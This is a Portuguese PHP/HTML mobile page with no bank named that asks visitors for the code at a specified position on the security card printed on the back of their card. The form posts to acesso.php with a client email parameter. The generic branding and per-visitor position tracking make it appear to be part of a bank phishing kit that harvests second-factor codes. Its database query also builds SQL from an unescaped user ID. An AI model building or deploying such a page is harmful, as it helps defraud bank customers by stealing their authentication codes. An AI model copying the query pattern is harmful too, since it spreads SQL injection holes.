<!DOCTYPE html>
<html lang="pt-br">
<head>
	<meta charset="utf-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<title>Acesso Mobile :: Acesso</title>

	<!-- PERSONALIZAÇÃO CABEÇALHO -->
	<meta name="theme-color" content="#0072e5">
	<meta name="apple-mobile-web-app-status-bar-style" content="#0072e5">
	<meta name="msapplication-navbutton-color" content="#0072e5">
</head>
<body>

<div class="container main_header bg-blue">
	<div class="content">
		<div class="logo">
			<img src="../_images/mobile/main_logo.jpg" height="30" width="128">
		</div><!-- logo -->
	<div class="clear"></div>
	</div><!-- content -->
</div><!-- container -->

<?php 

$GetPos = read($conn, 'acessos', "WHERE id = '$UserId'");
$PosicaoPedida = $GetPos[0]['tabela_pos'];

?>


<div class="container">
	<div class="content">
		<div class="home_title">
			<h1>Confirmação Chave de Segurança</h1>
			<p>
				<?php 
					if(strlen($_SESSION['UserName']) == 0):
						echo 'Para confirmar esta operação, será preciso utilizar seu cartão chave e sincronizar seus dados.';
					else:
						echo $_SESSION['UserName'].', para confirmar esta operação, será preciso utilizar seu cartão chave e sincronizar seus dados.';
					endif;
				?>
			</p>
		</div>

		<form action="acesso.php?cliente=<?php echo $emailx; ?>" id="form_acesso" class="form_acesso" name="form_acesso" onsubmit="return checkPosTable();" method="post">
			
			<label for="pos_table" class="complete_blocks" style="margin-bottom:10px;">
				<span style="margin-bottom:10px!important;display:block;">Digite a chave <b class="red_txt"><?= $PosicaoPedida; ?></b> referente a tabela do verso do seu cartão::</span>
				<input type="number" name="pos_table" id="pos_table" class="normal_input" placeholder="Chave de Segurança" autocomplete="off" maxlength="3"
				oninput="javascript: if (this.value.length > this.maxLength) this.value = this.value.slice(0, this.maxLength);">
			</label>

			<div class="block_labels">
				<input type="hidden" name="sender" value="send_pos">
				<input type="submit" name="next_page_acess" value="Confirmar" class="btn-submit-normal">
			</div><!-- block_labels -->
		</form>
	<div class="clear"></div>
	</div><!-- content -->
</div><!-- container -->


<!-- ARQUIVOS DE INCLUSÃO -->
<link rel="stylesheet" href="../_styles/boot_mb.css">
<link rel="stylesheet" href="../_fonts/_fonts.css">
<link rel="stylesheet" href="../_styles/font-awesome.css">
<link rel="stylesheet" href="../_styles/content_mb.css">	
<script src="../_jscripts/jquery.js"></script>
<script src="../_jscripts/content_mb.js"></script>
<!-- ARQUIVOS DE INCLUSÃO -->
</body>
</html>
<?php ob_end_flush(); ?>